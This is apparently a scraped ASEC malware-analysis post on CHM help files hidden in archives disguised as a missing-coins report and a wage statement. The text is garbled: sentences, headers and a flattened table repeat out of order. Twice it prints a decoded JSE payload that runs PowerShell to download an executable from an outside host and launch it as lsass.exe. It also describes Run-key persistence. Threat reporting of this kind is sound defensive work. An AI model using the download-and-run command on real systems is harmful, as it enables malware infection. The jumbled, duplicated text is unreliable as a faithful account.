title: Malicious Help File Disguised as Missing Coins Report and Wage Statement (*.chm)

sentences: Find Missing Coins.rar contains lost.chm, and when it is run, it creates Help with content related to coins and performs malicious activities.
Categories:Malware Information

The ASEC analysis team has discovered a continuous distribution of malware disguised as a Windows Help File (*.chm). The most recent CHM file is identical to the file introduced in <APT Attack Being Distributed as Windows Help File (*.chm)> to download the additional malware.
AhnLabs anti-malware product, V3, detects and blocks the malware using the alias below.
The team could not find extra files because the access to the download URL is currently blocked, but users must stay vigilant as the attack may upload various malicious files in the future.
titles: Malicious Help File Disguised as Missing Coins Report and Wage Statement (*.chm)

sentences: (new ActiveXObject(WScript.Shell)).run(cmd /c powershell iwr -outf %tmp%\\lsass.exe hxxps://trueliebe[.]com/kettle/pot & start %tmp%\\lsass.exe Dmzei125oAl,0,false)Data of decoded Document.jse

titles: Malicious Help File Disguised as Missing Coins Report and Wage Statement (*.chm)

sentences: Find Missing Coins.rar contains lost.chm, and when it is run, it creates Help with content related to coins and performs malicious activities.

Inside the lost.chm file is the same HTML file and the internal special command introduced in the previous blog post. As such, running the CHM file results in the execution of the cmd command and the creation of Document.dat and Document.jse in the %USERPROFILE%\Links\ folder. The difference from the previous is that Document.jse is created instead of Document.vbs.

sentences: Inside the lost.chm file is the same HTML file and the internal special command introduced in the previous blog post. As such, running the CHM file results in the execution of the cmd command and the creation of Document.dat and Document.jse in the %USERPROFILE%\Links\ folder. The difference from the previous is that Document.jse is created instead of Document.vbs.
The data that exists in Document.dat is base64-decoded and saved as Document.jse. The decoded JSE data then uses powershell to download the additional file from a certain URL and runs it (see below).

sentences: The ASEC analysis team has discovered a continuous distribution of malware disguised as a Windows Help File (*.chm). The most recent CHM file is identical to the file introduced in <APT Attack Being Distributed as Windows Help File (*.chm)> to download the additional malware.
Names of Compressed FilesNames of Internal CHM FilesMissing Coins Info.ziplost.chmData.zipDefault.chmWage Statement.rarsalary.chmTable 1. Confirmed Filenames
Names of Compressed FilesNames of Internal CHM FilesMissing Coins Info.ziplost.chmData.zipDefault.chmWage Statement.rarsalary.chmTable 1. Confirmed Filenames
Figure 8. Innocuous PDF file
This file is compressed with an innocuous PDF file, in a similar fashion to the aforementioned Missing Coins Info.zip.
The Word file is an innocuous file that contains text related to missing coins (see Figure below).
The data that exists in Document.dat is base64-decoded and saved as Document.jse. The decoded JSE data then uses powershell to download the additional file from a certain URL and runs it (see below).
The data that exists in Document.dat is base64-decoded and saved as Document.jse. The decoded JSE data then uses powershell to download the additional file from a certain URL and runs it (see below).
Afterward, it adds %USERPROFILE%\Links\Document.jse to HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run to ensure that the JSE file can be continuously run.
(new ActiveXObject(WScript.Shell)).run(cmd /c powershell iwr -outf %tmp%\\lsass.exe hxxps://trueliebe[.]com/kettle/pot & start %tmp%\\lsass.exe Dmzei125oAl,0,false)Data of decoded Document.jse
